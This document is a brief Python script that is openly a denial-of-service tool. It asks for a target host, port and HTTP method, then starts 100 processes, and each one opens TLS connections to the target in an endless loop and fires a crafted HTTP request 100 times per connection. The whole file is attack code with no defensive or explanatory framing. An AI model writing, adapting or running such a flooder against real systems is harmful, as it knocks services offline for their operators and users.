import random
import socket
import threading
import ssl
import multiprocessing
import requests
import time

ip = str(input("Host/Ip:"))
port = int(input("Port:"))
protocol = str(input("Protocol(GET,POST,DELETE,HEAD):"))
#multiple = int(input("Multiplier(100-300):"))
#threads = int(input("Threads(600-800):"))

useragents = [""]
acceptall = [""]
ref = [""]
connection = "keep-alive"
content    = "Content-Type: application/x-www-form-urlencoded\r\n"
length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
num_sent = 0
go = threading.Event()
def attack():
    global num_sent, useragents, acceptall, ref, connection, content, length
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    accept    = random.choice(acceptall)
    referer   = "Referer: " +random.choice(ref) + ip + "\r\n"
    get_host = protocol + " /?=" + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
    conn = "Connection: " + connection + "\r\n"
    request  = get_host + conn + useragent + accept + referer + content + length + "\r\n"
    go.wait()
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        num_sent = num_sent + 1
        print("[+] Sent ", num_sent, " => ", ip , ":", port)
        x = ssl.wrap_socket(s)
        try:
            for i in range (100):
                x.send(str.encode(request))
        except:
            x.close()

for y in range(100):
    th = multiprocessing.Process (target=attack)
    go.set()
    th.start()
